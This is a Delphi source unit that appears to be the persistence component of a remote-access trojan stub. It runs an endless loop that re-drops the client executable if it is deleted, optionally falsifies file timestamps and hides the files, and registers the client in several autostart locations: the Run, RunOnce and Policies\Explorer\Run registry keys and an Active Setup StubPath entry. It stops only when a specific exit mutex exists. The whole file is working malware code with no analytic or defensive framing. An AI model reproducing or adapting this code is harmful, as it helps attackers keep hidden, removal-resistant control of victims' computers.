unit UnitPersistence;

interface

uses
  Windows, UnitFunctions, UnitRegistryManager, UnitVariables, UnitConfiguration;

procedure InitPersistence;

implementation
   
procedure InitPersistence;
var
  TmpMutex: THandle;
  StubBuffer: string;
begin
  StubBuffer := FileToStr(ClientPath);

  while True do
  begin
    if not FileExists(ClientPath) then
    begin
      if not DirectoryExists(ExtractFilePath(ClientPath)) then
        CreatePath(ExtractFilePath(ClientPath));
        
      MyCreateFile(ClientPath, StubBuffer, Length(StubBuffer));

      if _ChangeDate = True then
      begin
        ChangeFileTime(ClientPath);
        ChangeDirTime(ExtractFilepath(ClientPath));
      end;

      if _Hide = True then
      begin
        HideFileName(ClientPath);
        HideFileName(ExtractFilepath(ClientPath));
      end;
    end;

    if _Startup then
    begin
      if _HKCUStartup then
      AddRegValue('HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\', _StartupKey, 'REG_SZ', ClientPath);

      if _HKLMStartup then
      AddRegValue('HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\', _StartupKey, 'REG_SZ', ClientPath);

      if _PoliciesStartup then
      AddRegValue('HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\', _StartupKey, 'REG_SZ', ClientPath);
      
      if _ActiveX <> '' then
      CreateKeyString(HKEY_LOCAL_MACHINE, 'SOFTWARE\Microsoft\Active Setup\Installed Components\' + _ActiveX, 'StubPath', ClientPath);

      if _RunOnceStartup then
      begin
        AddRegValue('HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\', _StartupKey, 'REG_SZ', ClientPath);
        AddRegValue('HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce\', _StartupKey, 'REG_SZ', ClientPath);
      end;
    end;

    TmpMutex := CreateMutex(nil, False, Pchar(_MutexName + '_EXIT'));
    if GetLastError = ERROR_ALREADY_EXISTS then Break else CloseHandle(TmpMutex);

    Sleep(5000);
  end;
end;

end.